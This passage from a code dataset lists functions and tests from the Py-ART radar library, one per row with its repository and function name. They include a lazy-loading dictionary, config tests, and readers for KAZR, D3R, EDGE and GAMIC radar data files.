                vel = container.get_nyquist_vel(0, check_uniform=False)
            return (0, vel)
        except LookupError:
            return (0, 30.0)
    else:
        return (0, 30.0)"
ARM-DOE/pyart,_deprecated_alias,"def _deprecated_alias(func, old_name, new_name):
    """"""

    A function for creating an alias to a renamed or moved function.

    Parameters
    ----------
    func : func
        The function which has been renamed or moved.
    old_name, new_name : str
        Name of the function before and after it was moved or renamed
        (with namespace if changed).

    Returns
    -------
    wrapper : func
        A wrapper version of func, which issues a DeprecatedFunctionName
        warning when the called.

    """"""

    def wrapper(*args, **kwargs):
        warnings.warn(('{0} has been deprecated and will be removed in future ' + 'versions of Py-ART, pleases use {1}. ').format(old_name, new_name), category=DeprecatedFunctionName)
        return func(*args, **kwargs)
    return wrapper"
ARM-DOE/pyart,wrapper,"def wrapper(*args, **kwargs):
    warnings.warn(('{0} has been deprecated and will be removed in future ' + 'versions of Py-ART, pleases use {1}. ').format(old_name, new_name), category=DeprecatedFunctionName)
    return func(*args, **kwargs)"
ARM-DOE/pyart,__init__,"def __init__(self, dic):
    """"""initalize.""""""
    self._dic = dic
    self._lazyload = {}"
ARM-DOE/pyart,__setitem__,"def __setitem__(self, key, value):
    """"""Set a key which will not be stored and evaluated traditionally.""""""
    self._dic[key] = value
    if key in self._lazyload:
        del self._lazyload[key]"
ARM-DOE/pyart,__getitem__,"def __getitem__(self, key):
    """"""Get the value of a key, evaluating a lazy key if needed.""""""
    if key in self._lazyload:
        value = self._lazyload[key]()
        self._dic[key] = value
        del self._lazyload[key]
    return self._dic[key]"
ARM-DOE/pyart,__delitem__,"def __delitem__(self, key):
    """"""Remove a lazy or traditional key from the dictionary.""""""
    if key in self._lazyload:
        del self._lazyload[key]
    else:
        del self._dic[key]"
ARM-DOE/pyart,__iter__,"def __iter__(self):
    """"""Iterate over all lazy and traditional keys.""""""
    return itertools.chain(self._dic.copy(), self._lazyload.copy())"
ARM-DOE/pyart,__len__,"def __len__(self):
    """"""Return the number of traditional and lazy keys.""""""
    return len(self._dic) + len(self._lazyload)"
ARM-DOE/pyart,__str__,"def __str__(self):
    """"""Return a string representation of the object.""""""
    if len(self._dic) == 0 or len(self._lazyload) == 0:
        seperator = ''
    else:
        seperator = ', '
    lazy_reprs = [(repr(k), repr(v)) for (k, v) in self._lazyload.items()]
    lazy_strs = ['{}: LazyLoad({})'.format(*r) for r in lazy_reprs]
    lazy_str = ', '.join(lazy_strs) + '}'
    return str(self._dic)[:-1] + seperator + lazy_str"
ARM-DOE/pyart,has_key,"def has_key(self, key):
    """"""True if dictionary has key, else False.""""""
    return key in self"
ARM-DOE/pyart,copy,"def copy(self):
    """"""
        Return a copy of the dictionary.

        Lazy keys are not evaluated in the original or copied dictionary.
        """"""
    dic = self.__class__(self._dic.copy())
    for (key, value_callable) in self._lazyload.items():
        dic.set_lazy(key, value_callable)
    return dic"
ARM-DOE/pyart,set_lazy,"def set_lazy(self, key, value_callable):
    """"""Set a lazy key to load from a callable object.""""""
    if key in self._dic:
        del self._dic[key]
    self._lazyload[key] = value_callable"
ARM-DOE/pyart,test_config_functions,"def test_config_functions():
    pyart.load_config(CUSTOM_CONFIG_FILE)
    assert pyart.config.get_field_name('reflectivity') == 'REF'
    assert pyart.config.get_fillvalue() == -5555.0
    metadata = pyart.config.get_metadata('azimuth')
    assert isinstance(metadata, dict)
    assert metadata['units'] == 'foo'
    assert pyart.config.get_metadata('foobar') == {}
    pyart.load_config()
    assert pyart.config.get_field_name('reflectivity') == 'reflectivity'"
ARM-DOE/pyart,test_filemetadata_custom,"def test_filemetadata_custom():
    pyart.load_config(CUSTOM_CONFIG_FILE)
    filemetadata = pyart.config.FileMetadata('mdv')
    assert filemetadata.get_field_name('DBZ_F') == 'velocity'
    assert filemetadata.get_field_name('foobar') is None
    time = filemetadata('time')
    assert isinstance(time, dict)
    assert 'foo' in time
    assert time['foo'] == 'bar'
    elev = filemetadata('elevation')
    assert isinstance(elev, dict)
    assert 'units' in elev
    assert elev['units'] == 'degrees'
    assert filemetadata('foobar') == {}
    filemetadata = pyart.config.FileMetadata('foo')
    assert filemetadata.get_field_name('foobar') == 'foobar'
    filemetadata = pyart.config.FileMetadata('sigmet', additional_metadata={'baz': {'units': 'baz_unit'}})
    assert filemetadata('baz')['units'] == 'baz_unit'
    filemetadata = pyart.config.FileMetadata('sigmet', file_field_names=True)
    assert filemetadata.get_field_name('DBT') == 'DBT'
    filemetadata = pyart.config.FileMetadata('sigmet', exclude_fields=['spectrum_width'])
    assert filemetadata.get_field_name('WIDTH2') is None"
ARM-DOE/pyart,test_init_load,"def test_init_load():
    os.environ['PYART_CONFIG'] = CUSTOM_CONFIG_FILE
    reload(pyart.config)
    assert pyart.config.get_field_name('reflectivity') == 'REF'
    os.environ['PYART_CONFIG'] = 'nullnullnull'
    with warnings.catch_warnings(record=True) as w:
        reload(pyart.config)
        assert len(w) > 0
    assert pyart.config.get_field_name('reflectivity') == 'reflectivity'
    os.environ['PYART_CONFIG'] = CUSTOM_CONFIG_FILE
    reload(pyart.config)
    assert pyart.config.get_field_name('reflectivity') == 'REF'
    os.environ.pop('PYART_CONFIG')
    reload(pyart.config)
    assert pyart.config.get_field_name('reflectivity') == 'reflectivity'"
ARM-DOE/pyart,test_intergration,"def test_intergration():
    pyart.load_config()
    radar = pyart.io.read_mdv(pyart.testing.MDV_PPI_FILE)
    assert 'reflectivity' in radar.fields
    assert 'velocity' not in radar.fields
    pyart.load_config(CUSTOM_CONFIG_FILE)
    radar = pyart.io.read_mdv(pyart.testing.MDV_PPI_FILE)
    assert 'reflectivity' not in radar.fields
    assert 'velocity' in radar.fields
    assert radar.time['foo'] == 'bar'
    pyart.load_config()"
ARM-DOE/pyart,test_debug_info,"def test_debug_info():
    buf = StringIO()
    pyart._debug_info(buf)
    assert len(buf.getvalue()) > 0"
ARM-DOE/pyart,test_debug_stdout,"def test_debug_stdout():
    pyart._debug_info()"
ARM-DOE/pyart,test_debug_info_all_disabled,"def test_debug_info_all_disabled():
    modules = ['numpy', 'scipy', 'matplotlib', 'netCDF4', 'cylp', 'glpk', 'cvxopt', 'mpl_toolkits', 'platform']
    save_dict = {}
    for module in modules:
        if module in sys.modules:
            save_dict[module] = sys.modules[module]
            sys.modules.pop(module)
    fail_loader = DisableModules(modules)
    sys.meta_path.append(fail_loader)
    with warnings.catch_warnings():
        warnings.simplefilter('ignore')
        buf = StringIO()
        pyart._debug_info(buf)
        assert len(buf.getvalue()) > 0
    sys.meta_path.remove(fail_loader)
    for module in save_dict.keys():
        sys.modules[module] = save_dict[module]"
ARM-DOE/pyart,__init__,"def __init__(self, modules):
    self.modules = modules"
ARM-DOE/pyart,find_module,"def find_module(self, fullname):
    if fullname in self.modules:
        raise ImportError('Debug import failure for %s' % fullname)"
ARM-DOE/pyart,plot_color_gradients,"def plot_color_gradients(cmap_category, cmap_list):
    nrows = len(cmap_list)
    figh = 0.35 + 0.15 + (nrows + (nrows - 1) * 0.1) * 0.22
    (fig, axs) = plt.subplots(nrows=nrows, figsize=(6.4, figh))
    fig.subplots_adjust(top=1 - 0.35 / figh, bottom=0.15 / figh, left=0.4, right=0.99)
    axs[0].set_title(cmap_category + ' Colormaps', fontsize=14)
    for (ax, cmap_name) in zip(axs, cmap_list):
        ax.imshow(gradient, aspect='auto', cmap=f'pyart_{cmap_name}')
        ax.text(-0.01, 0.5, f'pyart_{cmap_name}', va='center', ha='right', fontsize=10, transform=ax.transAxes)
    for ax in axs:
        ax.set_axis_off()"
ARM-DOE/pyart,quick_image_mute,"def quick_image_mute(field, muted_ref):
    nonmuted_field = np.ma.masked_where(~muted_ref.mask, field)
    muted_field = np.ma.masked_where(muted_ref.mask, field)
    return (nonmuted_field, muted_field)"
ARM-DOE/pyart,raise_build_error,"def raise_build_error(e):
    local_dir = os.path.split(__file__)[0]
    msg = STANDARD_MSG
    if local_dir == 'pyart/__check_build':
        msg = INPLACE_MSG
    dir_content = list()
    for (i, filename) in enumerate(os.listdir(local_dir)):
        if (i + 1) % 3:
            dir_content.append(filename.ljust(26))
        else:
            dir_content.append(filename + '\n')
    raise ImportError('{}\n___________________________________________________________________________\nContents of {}:\n{}\n___________________________________________________________________________\nIt seems that Py-ART has not been built correctly.\n\nIf you have installed Py-ART from source, please do not forget\nto build the package before using it: run `python setup.py install` in the\nsource directory.\n{}'.format(e, local_dir, ''.join(dir_content).strip(), msg))"
ARM-DOE/pyart,read_kazr,"def read_kazr(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None):
    """"""
    Read K-band ARM Zenith Radar (KAZR) NetCDF ingest data.

    Parameters
    ----------
    filename : str
        Name of NetCDF file to read data from.
    field_names : dict, optional
        Dictionary mapping field names in the file names to radar field names.
        Unlike other read functions, fields not in this dictionary or having a
        value of None are still included in the radar.fields dictionary, to
        exclude them use the `exclude_fields` parameter. Fields which are
        mapped by this dictionary will be renamed from key to value.
    additional_metadata : dict of dicts, optional
        This parameter is not used, it is included for uniformity.
    file_field_names : bool, optional
        True to force the use of the field names from the file in which
        case the `field_names` parameter is ignored. False will use to
        `field_names` parameter to rename fields.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.

    Returns
    -------
    radar : Radar
        Radar object.
    """"""
    filemetadata = FileMetadata('cfradial', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    ncobj = netCDF4.Dataset(filename)
    ncvars = ncobj.variables
    metadata = {k: getattr(ncobj, k) for k in ncobj.ncattrs()}
    metadata['n_gates_vary'] = 'false'
    if 'volume_number' in ncvars:
        metadata['volume_number'] = int(ncvars['volume_number'][:])
    else:
        metadata['volume_number'] = 0
    global_vars = {'platform_type': 'fixed', 'instrument_type': 'radar', 'primary_axis': 'axis_z'}
    for (var, default_value) in global_vars.items():
        if var in ncvars:
            metadata[var] = str(netCDF4.chartostring(ncvars[var][:]))
        else:
            metadata[var] = default_value
    time = cfradial._ncvar_to_dict(ncvars['time'])
    _range = cfradial._ncvar_to_dict(ncvars['range'])
    latitude = cfradial._ncvar_to_dict(ncvars['lat'])
    longitude = cfradial._ncvar_to_dict(ncvars['lon'])
    altitude = cfradial._ncvar_to_dict(ncvars['alt'])
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.array([0], dtype=np.int32)
    sweep_mode = filemetadata('sweep_mode')
    sweep_mode['data'] = np.array(['vertical_pointing'], dtype=str)
    fixed_angle = filemetadata('fixed_angle')
    fixed_angle['data'] = np.array([90.0], dtype=np.float32)
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_start_ray_index['data'] = np.array([0], dtype=np.int32)
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_end_ray_index['data'] = np.array([ncvars['time'].size - 1], dtype=np.int32)
    scan_type = 'vpt'
    azimuth = filemetadata('azimuth')
    azimuth['data'] = 0.0 * np.ones(ncvars['time'].size, dtype=np.float32)
    elevation = filemetadata('elevation')
    elevation['data'] = 90.0 * np.ones(ncvars['time'].size, dtype=np.float32)
    keys = [k for (k, v) in ncvars.items() if v.dimensions == ('time', 'range')]
    fields = {}
    for key in keys:
        field_name = filemetadata.get_field_name(key)
        if field_name is None:
            if exclude_fields is not None and key in exclude_fields:
                continue
            if include_fields is not None and key not in include_fields:
                continue
            field_name = key
        fields[field_name] = cfradial._ncvar_to_dict(ncvars[key])
    omega = float(ncobj.radar_operating_frequency.split()[0])
    frequency = filemetadata('frequency')
    frequency['data'] = np.array([omega / 1000000000.0], dtype=np.float32)
    prt_mode = filemetadata('prt_mode')
    prt_mode['data'] = np.array(['fixed'], dtype=str)
    prf = float(ncobj.pulse_repetition_frequency.split()[0])
    prt = filemetadata('prt')
    prt['data'] = 1.0 / prf * np.ones(ncvars['time'].size, dtype=np.float32)
    v_nq = float(ncobj.nyquist_velocity.split()[0])
    nyquist_velocity = filemetadata('nyquist_velocity')
    nyquist_velocity['data'] = v_nq * np.ones(ncvars['time'].size, dtype=np.float32)
    samples = int(ncobj.num_spectral_averages)
    n_samples = filemetadata('n_samples')
    n_samples['data'] = samples * np.ones(ncvars['time'].size, dtype=np.int32)
    instrument_parameters = {'frequency': frequency, 'prt_mode': prt_mode, 'prt': prt, 'nyquist_velocity': nyquist_velocity, 'n_samples': n_samples}
    ncobj.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,read_d3r_gcpex_nc,"def read_d3r_gcpex_nc(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, read_altitude_from_nc=False, **kwargs):
    """"""
    Read a D3R GCPEX netCDF file.

    Parameters
    ----------
    filename : str
        Name of the ODIM_H5 file to read.
    field_names : dict, optional
        Dictionary mapping ODIM_H5 field names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included.  A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the MDV data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    read_altitude_from_nc : bool, optional
        True if you want the altitude value to be read from the provider netCDF file.
        False will default to the value np.array([295.], dtype='float64')

    Returns
    -------
    radar : Radar
        Radar object containing data from ODIM_H5 file.

    """"""
    _test_arguments(kwargs)
    if field_names is None:
        field_names = D3R_FIELD_NAMES
    filemetadata = FileMetadata('cfradial', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    ncobj = netCDF4.Dataset(filename)
    ncvars = ncobj.variables
    nsweeps = 1
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = np.array([ncobj.Latitude], dtype='float64')
    longitude['data'] = np.array([ncobj.Longitude], dtype='float64')
    altitude_list = [ncobj.Altitude] if read_altitude_from_nc else [295.0]
    altitude['data'] = np.array(altitude_list, dtype='float64')
    metadata = filemetadata('metadata')
    metadata['source'] = 'Colorado State EE - chandrasekar'
    metadata['original_container'] = 'D3R_gcpex_nc'
    metadata['nc_conventions'] = ncobj.NetCDFRevision
    metadata['version'] = ncobj.NetCDFRevision
    metadata['source'] = 'Chandra'
    metadata['system'] = ncobj.RadarName
    metadata['software'] = ncobj.NetCDFRevision
    metadata['sw_version'] = ncobj.NetCDFRevision
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    rays_per_sweep = np.shape(ncvars['Azimuth'][:])
    ssri = np.cumsum(np.append([0], rays_per_sweep[:-1])).astype('int32')
    seri = np.cumsum(rays_per_sweep).astype('int32') - 1
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = seri
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    sweep_mode = filemetadata('sweep_mode')
    sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'])
    if ncobj.ScanType == 2:
        scan_type = 'ppi'
    else:
        scan_type = 'rhi'
    fixed_angle = filemetadata('fixed_angle')
    if ncobj.ScanType == 2:
        sweep_el = ncvars['Elevation'][0]
    else:
        sweep_el = ncvars['Azimuth'][0]
    fixed_angle['data'] = np.array([sweep_el], dtype='float32')
    elevation = filemetadata('elevation')
    elevation['data'] = ncvars['Elevation']
    _range = filemetadata('range')
    rstart = ncvars['StartRange'][:]
    if any(rstart != rstart[0]):
        raise ValueError('range start changes between sweeps')
    rscale = ncvars['GateWidth'][:] / 1000.0
    if any(rscale != rscale[0]):
        raise ValueError('range scale changes between sweeps')
    nbins = ncobj.NumGates
    _range['data'] = np.arange(nbins, dtype='float32') * rscale[0] + rstart[0] * 1000.0
    _range['meters_to_center_of_first_gate'] = rstart[0]
    _range['meters_between_gates'] = float(rscale[0])
    azimuth = filemetadata('azimuth')
    azimuth['data'] = ncvars['Azimuth'][:]
    _time = filemetadata('time')
    start_time = datetime.datetime.utcfromtimestamp(ncobj.Time)
    _time['units'] = make_time_unit_str(start_time)
    _time['data'] = (ncvars['Time'] - ncobj.Time).astype('float32')
    keys = [k for (k, v) in ncvars.items() if v.dimensions == ('Radial', 'Gate')]
    fields = {}
    for key in keys:
        field_name = filemetadata.get_field_name(key)
        if field_name is None:
            if exclude_fields is not None and key in exclude_fields:
                continue
            if include_fields is not None:
                if key not in include_fields:
                    continue
            field_name = key
        fields[field_name] = _ncvar_to_dict(ncvars[key])
    instrument_parameters = None
    return Radar(_time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_ncvar_to_dict,"def _ncvar_to_dict(ncvar):
    """"""Convert a NetCDF Dataset variable to a dictionary.""""""
    d = {k: getattr(ncvar, k) for k in ncvar.ncattrs() if k not in ['scale_factor', 'add_offset']}
    d['data'] = ncvar[:]
    if np.isscalar(d['data']):
        d['data'] = np.array(d['data'])
        d['data'].shape = (1,)
    return d"
ARM-DOE/pyart,read_edge_netcdf,"def read_edge_netcdf(filename, **kwargs):
    """"""
    Read a EDGE NetCDF file.

    Parameters
    ----------
    filename : str
        Name of EDGE NetCDF file to read data from.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('edge_netcdf')
    dset = netCDF4.Dataset(filename)
    nrays = len(dset.dimensions['Azimuth'])
    nbins = len(dset.dimensions['Gate'])
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = np.array([dset.Latitude], 'float64')
    longitude['data'] = np.array([dset.Longitude], 'float64')
    altitude['data'] = np.array([dset.Height], 'float64')
    metadata = filemetadata('metadata')
    metadata_mapping = {'vcp-value': 'vcp', 'radarName-value': 'radar_name', 'ConversionPlugin': 'conversion_software'}
    for (netcdf_attr, metadata_key) in metadata_mapping.items():
        if netcdf_attr in dset.ncattrs():
            metadata[metadata_key] = dset.getncattr(netcdf_attr)
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_start_ray_index['data'] = np.array([0], dtype='int32')
    sweep_end_ray_index['data'] = np.array([nrays - 1], dtype='int32')
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.array([0], dtype='int32')
    scan_type = 'ppi'
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    sweep_mode['data'] = np.array(1 * ['azimuth_surveillance'])
    fixed_angle['data'] = np.array([dset.Elevation], dtype='float32')
    time = filemetadata('time')
    start_time = datetime.datetime.utcfromtimestamp(dset.Time)
    time['units'] = make_time_unit_str(start_time)
    time['data'] = np.zeros((nrays,), dtype='float64')
    _range = filemetadata('range')
    step = float(dset.getncattr('MaximumRange-value')) / nbins * 1000.0
    _range['data'] = np.arange(nbins, dtype='float32') * step + step / 2
    _range['meters_to_center_of_first_gate'] = step / 2.0
    _range['meters_between_gates'] = step
    elevation = filemetadata('elevation')
    elevation_angle = dset.Elevation
    elevation['data'] = np.ones((nrays,), dtype='float32') * elevation_angle
    azimuth = filemetadata('azimuth')
    azimuth['data'] = dset.variables['Azimuth'][:]
    field_name = dset.TypeName
    field_data = np.ma.array(dset.variables[field_name][:])
    if 'MissingData' in dset.ncattrs():
        field_data[field_data == dset.MissingData] = np.ma.masked
    if 'RangeFolded' in dset.ncattrs():
        field_data[field_data == dset.RangeFolded] = np.ma.masked
    fields = {field_name: filemetadata(field_name)}
    fields[field_name]['data'] = field_data
    fields[field_name]['units'] = dset.variables[field_name].Units
    fields[field_name]['_FillValue'] = get_fillvalue()
    instrument_parameters = {}
    if 'PRF-value' in dset.ncattrs():
        dic = filemetadata('prt')
        prt = 1.0 / float(dset.getncattr('PRF-value'))
        dic['data'] = np.ones((nrays,), dtype='float32') * prt
        instrument_parameters['prt'] = dic
    if 'PulseWidth-value' in dset.ncattrs():
        dic = filemetadata('pulse_width')
        pulse_width = dset.getncattr('PulseWidth-value') * 1e-06
        dic['data'] = np.ones((nrays,), dtype='float32') * pulse_width
        instrument_parameters['pulse_width'] = dic
    if 'NyquistVelocity-value' in dset.ncattrs():
        dic = filemetadata('nyquist_velocity')
        nyquist_velocity = float(dset.getncattr('NyquistVelocity-value'))
        dic['data'] = np.ones((nrays,), dtype='float32') * nyquist_velocity
        instrument_parameters['nyquist_velocity'] = dic
    if 'Beamwidth' in dset.variables:
        dic = filemetadata('radar_beam_width_h')
        dic['data'] = dset.variables['Beamwidth'][:]
        instrument_parameters['radar_beam_width_h'] = dic
    dset.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,read_gamic,"def read_gamic(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, valid_range_from_file=True, units_from_file=True, pulse_width=None, **kwargs):
    """"""
    Read a GAMIC hdf5 file.

    Parameters
    ----------
    filename : str
        Name of GAMIC HDF5 file to read data from.
    field_names : dict, optional
        Dictionary mapping field names in the file names to radar field names.
        Unlike other read functions, fields not in this dictionary or having a
        value of None are still included in the radar.fields dictionary, to
        exclude them use the `exclude_fields` parameter. Fields which are
        mapped by this dictionary will be renamed from key to value.
    additional_metadata : dict of dicts, optional
        This parameter is not used, it is included for uniformity.
    file_field_names : bool, optional
        True to force the use of the field names from the file in which
        case the `field_names` parameter is ignored. False will use to
        `field_names` parameter to rename fields.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    valid_range_from_file : bool, optional
        True to extract valid range (valid_min and valid_max) for all
        field from the file when they are present.  False will not extract
        these parameters.
    units_from_file : bool, optional
        True to extract the units for all fields from the file when available.
        False will not extract units using the default units for the fields.
    pulse_width : list or None,
        Mandatory for gamic radar processors which have pulsewidth enums.
        pulse_width should contain the pulsewidth' in us.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    if not _H5PY_AVAILABLE:
        raise MissingOptionalDependency('h5py is required to use read_gamic but is not installed')
    _test_arguments(kwargs)
    filemetadata = FileMetadata('gamic', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    gfile = GAMICFile(filename)
    assert gfile.is_file_complete()
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    latitude['data'] = gfile.where_attr('lat', 'float64')
    longitude['data'] = gfile.where_attr('lon', 'float64')
    altitude['data'] = gfile.where_attr('height', 'float64')
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'GAMIC-HDF5'
    what_mapping = {'version': 'gamic_version', 'sets_scheduled': 'sets_scheduled', 'object': 'gamic_object', 'date': 'gamic_date'}
    for (gamic_key, metadata_key) in what_mapping.items():
        if gfile.is_attr_in_group('what', gamic_key):
            metadata[metadata_key] = gfile.raw_group_attr('what', gamic_key)
    how_keys = ['software', 'template_name', 'site_name', 'host_name', 'azimuth_beam', 'elevation_beam', 'sdp_name', 'sw_version', 'sdp_version', 'simulated']
    for key in how_keys:
        if gfile.is_attr_in_group('how', key):
            metadata[key] = gfile.raw_group_attr('how', key)
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_start_ray_index['data'] = gfile.start_ray.astype('int32')
    sweep_end_ray_index['data'] = gfile.end_ray.astype('int32')
    sweep_number = filemetadata('sweep_number')
    try:
        sweep_number['data'] = gfile.what_attrs('set_idx', 'int32')
    except KeyError:
        sweep_number['data'] = np.arange(gfile.nsweeps, dtype='int32')
    scan_type = gfile.raw_scan0_group_attr('what', 'scan_type').lower()
    if hasattr(scan_type, 'decode'):
        scan_type = scan_type.decode('utf-8')
    if not gfile.is_file_single_scan_type():
        raise NotImplementedError('Mixed scan_type volume.')
    if scan_type not in ['ppi', 'rhi']:
        message = 'Unknown scan type: %s, reading as RHI scans.' % scan_type
        warnings.warn(message)
        scan_type = 'rhi'
    sweep_mode = filemetadata('sweep_mode')
    fixed_angle = filemetadata('fixed_angle')
    if scan_type == 'rhi':
        sweep_mode['data'] = np.array(gfile.nsweeps * ['rhi'])
        fixed_angle['data'] = gfile.how_attrs('azimuth', 'float32')
    elif scan_type == 'ppi':
        sweep_mode['data'] = np.array(gfile.nsweeps * ['azimuth_surveillance'])
        fixed_angle['data'] = gfile.how_attrs('elevation', 'float32')
    time = filemetadata('time')
    t_data = gfile.ray_header('timestamp', 'int64')
    start_epoch = t_data[0] // 1000000.0
    start_time = datetime.datetime.utcfromtimestamp(start_epoch)
    time['units'] = make_time_unit_str(start_time)
    time['data'] = ((t_data - start_epoch * 1000000.0) / 1000000.0).astype('float64')
    _range = filemetadata('range')
    ngates = gfile.max_num_gates
    range_start = float(gfile.raw_scan0_group_attr('how', 'range_start'))
    range_samples = int(gfile.raw_scan0_group_attr('how', 'range_samples'))
    range_step = float(gfile.raw_scan0_group_attr('how', 'range_step')) * range_samples
    _range['data'] = np.arange(ngates, dtype='float32') * range_step + range_start
    _range['meters_to_center_of_first_gate'] = range_start
    _range['meters_between_gates'] = range_step
    elevation = filemetadata('elevation')
    start_angle = gfile.ray_header('elevation_start', 'float32')
    stop_angle = gfile.ray_header('elevation_stop', 'float32')
    elevation['data'] = _avg_radial_angles(start_angle, stop_angle)
    azimuth = filemetadata('azimuth')
    start_angle = gfile.ray_header('azimuth_start', 'float32')
    stop_angle = gfile.ray_header('azimuth_stop', 'float32')
    azimuth['data'] = _avg_radial_angles(start_angle, stop_angle) % 360.0
    fields = {}
    moment_groups = gfile.moment_groups()
    moment_names = gfile.moment_names(moment_groups)
    for (moment_name, group) in zip(moment_names, moment_groups):
        field_name = filemetadata.get_field_name(moment_name)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['data'] = gfile.moment_data(group, 'float32')
        field_dic['_FillValue'] = get_fillvalue()
        if valid_range_from_file:
            try:
                valid_min = gfile.raw_scan0_group_attr(group, 'dyn_range_min')
                valid_max = gfile.raw_scan0_group_attr(group, 'dyn_range_max')
                field_dic['valid_min'] = valid_min.decode('utf-8')
                field_dic['valid_max'] = valid_max.decode('utf-8')
            except:
                pass
        if units_from_file:
            try:
                units = gfile.raw_scan0_group_attr(group, 'unit')
                field_dic['units'] = units.decode('utf-8')
            except:
                pass
        fields[field_name] = field_dic
    ray_angle_res = filemetadata('ray_angle_res')
    ray_angle_res['data'] = gfile.how_attrs('angle_step', 'float32')
    rays_are_indexed = filemetadata('rays_are_indexed')
    rays_are_indexed['data'] = np.array([['false', 'true'][i] for i in gfile.how_attrs('angle_sync', 'uint8')])
    target_scan_rate = filemetadata('target_scan_rate')
    target_scan_rate['data'] = gfile.how_attrs('scan_speed', 'float32')
    scan_rate = filemetadata('scan_rate')
    scan_rate['data'] = target_scan_rate['data']
    if scan_type == 'ppi':
        azs_names = ['az_speed', 'azimuth_speed']
        azs_name = azs_names[0]
        for azs_name in azs_names:
            if gfile.is_field_in_ray_header(azs_name):
                scan_rate['data'] = gfile.ray_header(azs_name, 'float32')
                break
    elif scan_type == 'rhi':
        els_names = ['el_speed', 'elevation_speed']
        els_name = els_names[0]
        for els_name in els_names:
            if gfile.is_field_in_ray_header(els_name):
                scan_rate['data'] = gfile.ray_header(els_name, 'float32')
                break
    else:
        scan_rate = None
    instrument_parameters = _get_instrument_params(gfile, filemetadata, pulse_width)
    gfile.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters, ray_angle_res=ray_angle_res, rays_are_indexed=rays_are_indexed, scan_rate=scan_rate, target_scan_rate=target_scan_rate)"
ARM-DOE/pyart,_get_instrument_params,"def _get_instrument_params(gfile, filemetadata, pulse_width):
    """"""Return a dictionary containing instrument parameters.""""""
    instrument_params = {}
    dic = filemetadata('frequency')
    dic['data'] = np.array([LIGHT_SPEED / gfile.raw_scan0_group_attr('how', 'radar_wave_length')], dtype='float32')
    instrument_params['frequency'] = dic
    dic = filemetadata('radar_beam_width_h')
    dic['data'] = gfile.how_attr('azimuth_beam', 'float32')
    instrument_params['radar_beam_width_h'] = dic
    dic = filemetadata('radar_beam_width_v')
    dic['data'] = gfile.how_attr('elevation_beam', 'float32')
    instrument_params['radar_beam_width_v'] = dic
    dic = filemetadata('pulse_width')
    pw_names = ['pulse_width_us', 'pulse_width_mks', 'pulse_width']
    pw_name = 'pulse_width_us'
    dic['data'] = None
